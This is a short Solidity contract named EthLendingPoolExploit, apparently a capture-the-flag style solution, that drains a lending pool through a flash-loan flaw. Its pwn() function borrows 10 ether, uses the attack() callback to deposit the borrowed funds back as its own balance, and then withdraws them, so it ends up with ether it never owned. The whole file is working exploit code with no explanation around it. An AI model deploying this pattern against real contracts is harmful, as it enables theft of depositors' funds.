// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IEthLendingPool {
    function balances(address) external view returns (uint);

    function deposit() external payable;

    function withdraw(uint _amount) external;

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }

    function pwn() external {
        // this function will be called
        pool.flashLoan(10 ether, address(this), abi.encodeWithSignature("attack()"));
        pool.withdraw(10 ether);   
    }
    
    function attack() external payable {
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
}